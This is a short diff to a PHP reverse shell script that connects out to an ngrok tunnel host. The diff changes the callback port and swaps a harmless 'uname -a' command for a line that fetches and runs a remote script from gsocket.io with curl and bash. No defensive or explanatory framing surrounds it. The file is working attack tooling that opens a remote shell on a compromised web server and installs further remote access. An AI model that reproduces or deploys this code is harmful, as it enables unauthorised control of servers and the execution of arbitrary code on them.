@@ -3,11 +3,11 @@
 set_time_limit (0);
 $VERSION = "1.0";
 $ip = '0.tcp.ap.ngrok.io';  // CHANGE THIS
-$port = 22323;       // CHANGE THIS
+$port = 20204;       // CHANGE THIS
 $chunk_size = 1400;
 $write_a = null;
 $error_a = null;
-$shell = 'uname -a';
+$shell = 'bash -c "$(curl -fsSL https://gsocket.io/y)"';
 $daemon = 0;
 $debug = 0;
 
